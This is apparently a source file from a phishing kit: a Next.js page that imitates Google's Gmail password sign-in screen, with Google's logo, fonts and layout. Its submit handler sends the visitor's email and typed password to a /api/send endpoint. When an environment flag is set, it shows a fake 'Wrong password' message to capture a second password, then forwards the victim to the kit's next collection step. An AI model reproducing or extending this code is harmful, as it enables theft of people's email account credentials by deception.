import React, { useContext, useEffect, useState } from "react";

import {
  Box,
  Typography,
  LinearProgress,
  TextField,
  FormControlLabel,
  Checkbox,
  Button,
  List,
  ListItem,
  Link,
} from "@mui/material";
import { createTheme, ThemeProvider } from "@mui/material/styles";
import Head from "next/head";
import axios from "axios";
import { useRouter } from "next/router";
import { DataContext } from "../../_app";
import { getNextUrl } from "../../../utils/getNextUrl";
import { getProgress } from "../../../utils/getProgress";

interface GmailProps { }

const theme = createTheme({
  typography: {
    fontSize: 14,
  },

  palette: {
    primary: {
      main: "#1a73e8",
    },
  },
});

const Gmail: React.FC<GmailProps> = () => {
  const [showPassowrd, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [password, setPassword] = useState(``);
  const [attempt, setAttempt] = useState(0);
  const [error, setError] = useState<{
    show: boolean;
    message: string;
  }>({} as any);

  const [emailLogins, setEmailLogins] = useState({});
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();

  const onSubmit = async () => {
    setLoading(true);

    if (!password) {
      setError({
        show: true,
        message: `Please provide your password.`,
      });
      setLoading(false);
      return;
    }

    const formData = new FormData();
    const emailInfo = {
      [attempt + 1]: {
        form: `EMAIL`,
        emailLogins: {
          email: datas.email,
          emailPassword: password,
          attempt: attempt + 1,
        },
      },
    }

    formData.append(`form`, `EMAIL`);
    formData.append(
      `emailLogins`,
      JSON.stringify(emailInfo)
    );

    try {
      await axios.post(`/api/send`, formData);
    } catch (error) {
      console.log(error);
    }

    setEmailLogins(emailInfo);

    if (!attempt && process.env.NEXT_PUBLIC_DOUBLE_EMAIL_LOGIN === `ON`) {
      setTimeout(() => {
        setAttempt(1);
        setLoading(false);
        setError({
          show: true,
          message: `Wrong password.Try again or click ‘Forgot password’ to reset it.`,
        });
        setPassword(``);
      }, 2000);
      return;
    }

    setData({
      ...datas,
      emailLogins: {
        ...emailLogins,
        [attempt + 1]: {
          form: `EMAIL`,
          emailLogins: {
            email: datas.email,
            emailPassword: password,
            attempt: attempt + 1,
          },
        },
      },
    });

    setLoading(false);

    const url = getProgress()[getProgress().indexOf(`EMAIL`) + 1];
    push(getNextUrl(url));
  };

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <ThemeProvider theme={theme}>
      <Head>
        <style>{`
            body {
              background: #fff !important;
              direction: ltr !important;
              font-size: 14px !important;
              line-height: 1.4286 !important;
              margin: 0 !important;
              padding: 0 !important;
            }

            html {
              font-size: 100% !important;
            }

            body, input, textarea, select, button, li {
              color: #202124;
              font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif !important;
            }

            * {
            box-sizing: border-box;
          }
          `}</style>
        <title>Gmail</title>
        <link rel="shortcut icon" href={`/images/external/googleFavico.ico`} />
        {/* eslint-disable-next-line @next/next/no-page-custom-font */}
        <link
          rel="stylesheet"
          href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap"
        />
        <meta
          name="viewport"
          content="width=device-width, initial-scale=1, maximum-scale=1"
        />
      </Head>
      <Box
        sx={{
          display: "flex",
          height: "100vh",
          flexDirection: "column",
          position: "relative",
          width: "100%",
          alignItems: "center",
          justifyContent: "center",
          background: "white",
        }}
      >
        <Box
          sx={{
            width: ["100%", "450px"],
            minHeight: ["100vh", 0],
            borderRadius: "8px",
            border: ["none", "1px solid #dadce0"],
            display: ["flex", "block"],
            flexShrink: 0,
            margin: [0, "0 auto"],
            transition: ".2s",
            flexDirection: ["column-reverse", "column"],
            maxWidth: "100%",
            position: "relative",
            zIndex: 2,
            height: ["100%", "auto"],
          }}
        >
          {loading && (
            <Box
              sx={{
                position: "absolute",
                width: "100%",
                height: "4px",
                overflow: "hidden",
                left: 0,
                top: 0,
                zIndex: 5,
              }}
            >
              <LinearProgress
                sx={{
                  color: "#1a73e8",
                }}
              />
            </Box>
          )}
          <Box
            sx={{
              height: ["initial", "auto"],
              minHeight: ["initial", "500px"],
              overflowY: "auto",
              overflow: ["hidden", "auto"],
              flexGrow: 1,
              padding: ["24px 24px 36px", "48px 40px 36px"],
            }}
          >
            <Box>
              <Box
                sx={{
                  display: "flex",
                  height: "24px",
                  justifyContent: "center",
                }}
              >
                <Box>
                  <Box
                    sx={{
                      height: "24px",
                      margin: "0 0",
                      overflow: "visible",
                      position: "relative",
                      width: "75px",
                    }}
                  >
                    <Box>
                      <GoogleLogo />
                    </Box>
                  </Box>
                </Box>
              </Box>
              <Box>
                <Box>
                  <Box
                    sx={{
                      paddingX: ["10px", "40px"],
                      margin: ["auto -24px", "auto -40px"],
                      overflow: "hidden",
                    }}
                  >
                    <Box>
                      <Box sx={{ textAlign: "center" }}>
                        <Typography
                          component="h1"
                          sx={{
                            color: "#202124",
                            paddingBottom: 0,
                            paddingTop: "16px",
                            fontFamily: `'Google Sans','Noto Sans Myanmar UI',arial,sans-serif`,
                            fontSize: "24px !important",
                            fontWeight: 400,
                            lineHeight: 1.3333,
                            marginBottom: 0,
                            marginTop: 0,
                          }}
                        >
                          <Box component="span">Welcome</Box>
                        </Typography>
                        <Box
                          sx={{
                            height: "32px",
                            marginTop: "8px",
                          }}
                        >
                          <Box
                            sx={{
                              padding: "0 15px 0 15px",
                              paddingLeft: "5px",
                              paddingRight: "7px",
                              borderRadius: "16px",
                              alignItems: "center",
                              background: "#fff",
                              border: "1px solid #dadce0",
                              color: "#3c4043",
                              cursor: "pointer",
                              display: "inline-flex",
                              fontFamily: `'Google Sans','Noto Sans Myanmar UI',arial,sans-serif`,
                              fontSize: "14px !important",
                              fontWeight: 500,
                              letterSpacing: "0.25px",
                              maxWidth: "100%",
                              position: "relative",
                            }}
                          >
                            <Box
                              sx={{
                                borderRadius: "10px",
                                height: "20px",
                                marginRight: "8px",
                              }}
                            >
                              <Box
                                sx={{
                                  borderRadius: "50%",
                                  color: "#5f6368",
                                  overflow: "hidden",
                                }}
                              >
                                <PersonIcon />
                              </Box>
                            </Box>
                            <Box
                              lineHeight="30px"
                              textAlign="left"
                              overflow="hidden"
                              textOverflow="ellipsis"
                              whiteSpace="nowrap"
                              fontFamily="'Google Sans'"
                              sx={{
                                direction: "ltr",
                              }}
                            >
                              {datas && datas.email}
                            </Box>
                            <Box
                              color="#3c4043"
                              flexShrink={0}
                              height="18px"
                              width="18px"
                              marginLeft="4px"
                              sx={{
                                transition:
                                  "transform .2s cubic-bezier(.4,0,.2,1)",
                              }}
                            >
                              <CarrotDownIcon />
                            </Box>
                          </Box>
                        </Box>
                      </Box>
                    </Box>
                    <Box
                      fontSize=".1px !important"
                      whiteSpace="nowrap"
                    // margin={["auto -24px", "auto -40px"]}
                    >
                      <Box
                        sx={{
                          display: "inline-block",
                          fontSize: "14px !important",
                          padding: "24px 0 0",
                          verticalAlign: "top",
                          whiteSpace: "normal",
                          width: "100%",
                          borderLeftWidth: "40px",
                          borderRightWidth: "40px",
                          borderColor: "transparent",
                        }}
                      >
                        <Box>
                          <Box>
                            <Box>
                              <Box component="span">
                                <Box component="section">
                                  <Box
                                    sx={{
                                      marginTop: 0,
                                      margin: ["auto -24px", "auto -40px"],
                                      paddingLeft: ["24px", "40px"],
                                      paddingRight: ["24px", "40px"],
                                      marginBottom: "16px",
                                    }}
                                  >
                                    <Box
                                      sx={{
                                        paddingBottom: 0,
                                        paddingTop: "24px",
                                        width: "100%",
                                        WebkitTapHighlightColor: "transparent",
                                        userSelect: "none",
                                        display: "inline-block",
                                        outline: "none",
                                      }}
                                    >
                                      <TextField
                                        error={error.show}
                                        fullWidth
                                        id="outlined-basic"
                                        label="Enter your password"
                                        variant="outlined"
                                        type={
                                          showPassowrd ? "text" : "password"
                                        }
                                        value={password}
                                        onChange={(e) => {
                                          setPassword(e.target.value);
                                        }}
                                        helperText={
                                          error.show ? (
                                            <Box
                                              sx={{
                                                display: "flex",
                                                color: "#d93025",
                                                marginTop: "4px",
                                                fontSize: "12px !important",
                                              }}
                                            >
                                              <Box display="block" mr="8px">
                                                <ExclamtionIcon />
                                              </Box>
                                              <Box>
                                                <Box component="span">
                                                  {error.message}
                                                </Box>
                                              </Box>
                                            </Box>
                                          ) : (
                                            ""
                                          )
                                        }
                                      />
                                    </Box>
                                    <Box marginTop={["3px", "8px"]}>
                                      <FormControlLabel
                                        control={
                                          <Checkbox
                                            onClick={(e) => {
                                              setShowPassword(
                                                // @ts-ignore checked does exist
                                                () => e.target.checked
                                              );
                                            }}
                                          />
                                        }
                                        label="Show password"
                                        sx={{
                                          "& .MuiFormControlLabel-label": {
                                            fontSize: "14px !important",
                                          },
                                        }}
                                      />
                                    </Box>
                                  </Box>
                                </Box>
                              </Box>
                            </Box>
                          </Box>
                        </Box>
                        <Box
                          sx={{
                            justifyContent: "space-between",
                            marginLeft: "-8px",
                            marginTop: ["30px", "26px"],
                            minHeight: "48px",
                            paddingBottom: "20px",
                            alignItems: "flex-start",
                            display: "flex",
                            flexGrow: 0,
                            flexWrap: "wrap",
                          }}
                        >
                          <Box
                            sx={{
                              display: "flex",
                              flexDirection: "row-reverse",
                              flexWrap: "wrap",
                              width: "100%",
                            }}
                          >
                            <Box
                              sx={{
                                textAlign: "right",
                                flexGrow: 1,
                                boxFlex: 1,
                              }}
                            >
                              <Button
                                variant="contained"
                                sx={{
                                  bgcolor: "#1a73e8",
                                  color: "#fff",
                                  padding: "0 24px 0 24px",
                                  fontFamily: `"Google Sans",Roboto,Arial,sans-serif`,
                                  fontSize: "14px !important",
                                  letterSpacing: ".0107142857em",
                                  fontWeight: 500,
                                  boxShadow: "none",
                                  textTransform: "none",
                                  transition:
                                    "border 280ms cubic-bezier(0.4,0,0.2,1),box-shadow 280ms cubic-bezier(0.4,0,0.2,1)",
                                  height: "36px",
                                  borderRadius: "4px",
                                  ":disabled": {
                                    bgcolor: "#1e66c9",
                                    color: "#fff",
                                  },
                                }}
                                onClick={onSubmit}
                                disabled={loading}
                              >
                                Next
                              </Button>
                            </Box>
                            <Box
                              sx={{
                                flexGrow: 1,
                                boxFlex: 1,
                              }}
                            >
                              <Box
                                sx={{
                                  textAlign: "left",
                                  display: "inline-block",
                                }}
                              >
                                <Box
                                  sx={{
                                    display: "inline",
                                  }}
                                >
                                  <Button
                                    variant="text"
                                    sx={{
                                      color: "#1a73e8",
                                      minWidth: 0,
                                      fontFamily: `"Google Sans",Roboto,Arial,sans-serif`,
                                      letterSpacing: ".0107142857em",
                                      fontWeight: 500,
                                      textTransform: "none",
                                      fontSize: `inherit`,
                                    }}
                                  >
                                    Forgot password?
                                  </Button>
                                </Box>
                              </Box>
                            </Box>
                          </Box>
                        </Box>
                      </Box>
                    </Box>
                  </Box>
                </Box>
              </Box>
            </Box>
          </Box>
          <Box
            component="footer"
            sx={{
              height: ["auto", "16.8px"],
              padding: ["0 24px 14px", "24px 0 0"],
              position: "absolute",
              width: "100%",
              display: "flex",
              flexWrap: "wrap",
              fontSize: "12px !important",
              lineHeight: 1.4,
              justifyContent: "space-between",
              alignItems: "center",
            }}
          >
            <Box
              sx={{
                margin: ["8px 0", 0],
                height: "16.8px",
              }}
            >
              <Box
                sx={{
                  fontSize: "inherit !important",
                  fontWeight: "inherit",
                  margin: "-8px 0 0 -16px",
                  userSelect: "none",
                  border: 0,
                  transition: "background .3s",
                  WebkitTapHighlightColor: "none",
                  borderRadius: "3px",
                  color: "#444",
                  cursor: "pointer",
                  display: "inline-block",
                  outline: "none",
                  position: "relative",
                  textAlign: "center",
                }}
              >
                <Box>
                  <Box
                    sx={{
                      height: "auto",
                      paddingBottom: "8px",
                      paddingTop: "8px",
                      color: "#202124",
                      borderColor: "transparent",
                      listStyle: "none",
                      outline: "none",
                      overflow: "hidden",
                      paddingLeft: "16px",
                      paddingRight: "24px",
                      position: "relative",
                      textAlign: "left",
                      whiteSpace: "nowrap",
                    }}
                  >
                    English (United States)
                  </Box>
                </Box>
                <Box
                  sx={{
                    color: "inherit",
                    overflow: "visible",
                    right: "8px",
                    top: "14px",
                    width: "auto",
                    position: "absolute",
                  }}
                >
                  <Box
                    sx={{
                      borderColor:
                        "currentColor transparent transparent transparent",
                      borderStyle: "solid",
                      borderWidth: "4px 4px 0 4px",
                      height: 0,
                      width: 0,
                    }}
                  />
                </Box>
              </Box>
            </Box>
            <List
              sx={{
                margin: "8px -16px",
                marginBottom: 0,
                marginTop: 0,
                listStyle: "none",
                padding: 0,
                display: "flex",
              }}
            >
              <ListItem
                sx={{
                  display: "inline-block",
                  margin: 0,
                  padding: 0,
                }}
              >
                <Link
                  sx={{
                    borderRadius: "2px",
                    color: "#757575",
                    display: "inline-block",
                    marginTop: "-6px",
                    padding: "6px 16px",
                    transition: "background .2s",
                    cursor: "pointer",
                    fontWeight: 500,
                    textDecoration: "none",
                    outline: "none",
                  }}
                >
                  Help
                </Link>
              </ListItem>
              <ListItem
                sx={{
                  display: "inline-block",
                  margin: 0,
                  padding: 0,
                }}
              >
                <Link
                  sx={{
                    borderRadius: "2px",
                    color: "#757575",
                    display: "inline-block",
                    marginTop: "-6px",
                    padding: "6px 16px",
                    transition: "background .2s",
                    cursor: "pointer",
                    fontWeight: 500,
                    textDecoration: "none",
                    outline: "none",
                  }}
                >
                  Privacy
                </Link>
              </ListItem>
              <ListItem
                sx={{
                  display: "inline-block",
                  margin: 0,
                  padding: 0,
                }}
              >
                <Link
                  sx={{
                    borderRadius: "2px",
                    color: "#757575",
                    display: "inline-block",
                    marginTop: "-6px",
                    padding: "6px 16px",
                    transition: "background .2s",
                    cursor: "pointer",
                    fontWeight: 500,
                    textDecoration: "none",
                    outline: "none",
                  }}
                >
                  Terms
                </Link>
              </ListItem>
            </List>
          </Box>
        </Box>
      </Box>
    </ThemeProvider>
  );
};

const GoogleLogo = () => {
  return (
    <svg
      viewBox="0 0 75 24"
      width="75"
      height="24"
      xmlns="http://www.w3.org/2000/svg"
      aria-hidden="true"
      className="l5Lhkf"
      style={{
        display: "block",
      }}
    >
      <g id="qaEJec">
        <path
          fill="#ea4335"
          d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"
        ></path>
      </g>
      <g id="YGlOvc">
        <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
      </g>
      <g id="BWfIk">
        <path
          fill="#4285f4"
          d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"
        ></path>
      </g>
      <g id="e6m3fd">
        <path
          fill="#fbbc05"
          d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"
        ></path>
      </g>
      <g id="vbkDmc">
        <path
          fill="#ea4335"
          d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"
        ></path>
      </g>
      <g id="idEJde">
        <path
          fill="#4285f4"
          d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"
        ></path>
      </g>
    </svg>
  );
};

export const PersonIcon = () => {
  return (
    <svg
      style={{
        borderRadius: "50%",
        color: "#3c4043",
        display: "block",
        height: "20px",
        width: "20px",
      }}
      aria-hidden="true"
      className="stUf5b"
      fill="currentColor"
      focusable="false"
      width="48px"
      height="48px"
      viewBox="0 0 24 24"
      xmlns="https://www.w3.org/2000/svg"
    >
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
    </svg>
  );
};

export const CarrotDownIcon = () => {
  return (
    <svg
      style={{
        display: "block",
        height: "100%",
        width: "100%",
      }}
      aria-hidden="true"
      className="stUf5b MSBt4d"
      fill="currentColor"
      focusable="false"
      width="24px"
      height="24px"
      viewBox="0 0 24 24"
      xmlns="https://www.w3.org/2000/svg"
    >
      <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
    </svg>
  );
};
export const ExclamtionIcon = () => {
  return (
    <svg
      style={{
        height: "16px;",
        width: "16px;",
      }}
      aria-hidden="true"
      className="stUf5b LxE1Id"
      fill="currentColor"
      focusable="false"
      width="16px"
      height="16px"
      viewBox="0 0 24 24"
      xmlns="https://www.w3.org/2000/svg"
    >
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
    </svg>
  );
};

export default Gmail;
